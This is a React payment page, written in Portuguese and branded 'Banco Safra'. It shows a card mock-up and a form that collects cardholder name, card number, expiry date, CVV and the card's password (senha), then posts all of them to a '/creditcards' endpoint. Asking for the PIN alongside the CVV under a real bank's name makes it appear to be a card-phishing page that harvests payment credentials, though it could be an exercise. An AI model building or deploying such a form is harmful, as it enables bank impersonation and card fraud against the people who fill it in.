import { useState } from "react";
import { FcSimCardChip } from "react-icons/fc";
import { LuNfc } from "react-icons/lu";
import { ToastContainer, toast } from 'react-toastify';
import instance from "../../api/instance";

export default function PagePagamento(){
    const [nome, setNome] = useState("");
    const [numero, setNumero] = useState("0000 0000 0000 0000");
    const [mes, setMes] = useState(0);
    const [ano, setAno] = useState(0);
    const [cvv, setCvv] = useState(0);
    const [senha, setSenha] = useState(0);
  
  
    function handleCardNumber(event) {
      let cardNumber = event.target.value;
      let formattedCardNumber = cardNumber.replace(/\D/g, '');
      formattedCardNumber = formattedCardNumber.substring(0, 16);
      formattedCardNumber = formattedCardNumber.replace(/(\d{4})/g, '$1 ').trim();
      setNumero(formattedCardNumber);
    }
  
  
    async function sendCartao(event) {
      event.preventDefault()
  
  
      if (!nome || !numero || !mes || !ano || !cvv || !senha) {
        toast.error("Prencha todos os campos")
        return
      }
  
  
      if (cvv.length !== 3) {
        toast.error("CVV inválido")
        return
      }
  
  
      // if (mes.length !== 2 || ano.length !== 4) {
      //   toast.error("Data de expiração inválido")
      //   return
      // }
  
  
      // const currentDate = new Date()
      // const dateCard = new Date(`20${ano}`, mes - 1, 1)
  
  
      // if (dateCard < currentDate) {
      //   toast.error("Data de expiração inválida")
      //   return
      // }
  
  
      try {
        await instance.post("/creditcards", {
          name: nome,
          number: numero.replace(/\D/g, ''),
          expiration: `${mes}/${ano}`,
          cvv: cvv,
          password: senha
        })
  
  
        toast.success("Dados enviados com sucesso")
      } catch (error) {
        toast.error("Erro ao enviar os dados")
        console.error(error)
      }
    }
  
  
    return (
      <div className="w-full h-screen flex">
        <ToastContainer
          position="bottom-right"
          autoClose={5000}
          theme="colored"
        />
        <div className="w-[50%] h-full relative">
          <div className="w-[60%] h-full bg-[#070032]"></div>
          <div className="w-[40%] h-full"></div>
          <div className="w-full  h-full absolute top-0 flex flex-col">
            <div className="w-[480px] h-[280px] bg-black rounded-[20px] mt-[30px] ml-[70px]">
              <div className="w-full h-[30%] flex">
                <div className="w-[30%] h-full flex items-center justify-center gap-[5px]">
                  <div className="bg-gray-50 w-[70px] h-[70px] rounded-full"></div>
                  <div className="bg-gray-50 w-[50px] h-[50px] rounded-full"></div>
                </div>
                <div className="w-[70%] h-full flex items-start justify-end pr-[20px] pt-[15px]">
                  <p className="text-[23px] text-white font-bold">Banco Safra</p>
                </div>
              </div>
              <div className="w-full h-[30%] pl-[20px] flex items-center">
                <FcSimCardChip size={80} />
                <LuNfc size={30} color="#ffffff" />
              </div>
              <div className="w-full pl-[27px]">
                <p className="text-[30px] text-white">{numero || "0000 0000 0000 0000"}</p>
                <p className="text-white text-[20px] font-bold">{nome || "Nome do Cartão"}</p>
              </div>
            </div>
            <div className="w-[480px] h-[280px] bg-black rounded-[20px] mt-[50px] ml-[210px]">
              <div className="w-full h-[30%] flex items-end">
                <div className="w-full h-[75%] bg-neutral-900"></div>
              </div>
              <div className="w-full h-[70%] flex justify-center pt-[30px]">
                <div className="w-[70%] h-[55px] bg-gray-500 flex justify-end items-center pr-[20px]">
                  <p className="text-[26px] ">000</p>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="w-[50%] h-full">
          <div className="w-full h-[30%] p-[35px]">
            <h1 className="text-[50px]">Preencha seus dados</h1>
          </div>
          <div className="w-full h-[70%] flex justify-center">
            <form onSubmit={sendCartao}
              className="w-[60%] h-full flex flex-col gap-[10px]">
              <div className="w-full flex flex-col">
                <label htmlFor="" className="text-[20px]">Nome do Cartão</label>
                <input
                  type="text"
                  className="w-full p-[10px] bg-gray-300"
                  onChange={
                    (event) => { setNome(event.target.value) }
                  }
                />
              </div>
              <div className="w-full flex flex-col">
                <label htmlFor="" className="text-[20px]">Número do Cartão</label>
                <input
                  type="text"
                  value={numero}
                  className="w-full p-[10px] bg-gray-300"
                  placeholder="0000 0000 0000 0000"
                  onChange={
                    (event) => { handleCardNumber(event) }
                  }
                />
              </div>
              <div className="w-full flex">
                <div className="w-[65%] flex flex-col">
                  <label htmlFor="" className="text-[20px]">Data de Expiração</label>
                  <div className="flex gap-[10px]">
                    <input
                      type="number"
                      className="w-[45%] p-[10px] bg-gray-300"
                      placeholder="MM"
                      onChange={
                        (event) => { setMes(event.target.value) }
                      }
                    />
                    <input
                      type="number"
                      className="w-[45%] p-[10px] bg-gray-300"
                      placeholder="AA"
                      onChange={
                        (event) => { setAno(event.target.value) }
                      }
                    />
                  </div>
                </div>
                <div className="w-[35%] flex flex-col">
                  <label htmlFor="" className="text-[20px]">CVV</label>
                  <input
                    type="number"
                    className="w-[100%] p-[10px] bg-gray-300"
                    onChange={
                      (event) => { setCvv(event.target.value) }
                    }
                  />
                </div>
              </div>
              <div className="w-full flex flex-col">
                <label htmlFor="" className="text-[20px]">Senha do Cartão</label>
                <input
                  type="password"
                  className="w-full p-[10px] bg-gray-300"
                  placeholder="******"
                  onChange={
                    (event) => { setSenha(event.target.value) }
                  }
                />
              </div>
              <div className="w-full flex items-center justify-center">
                <button
                  type="submit"
                  className="w-[90%] h-[40px] border-none rounded-[5px] bg-[#6959d7] text-white font-bold mt-[10px]"
                >
                  Comprar
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    )
}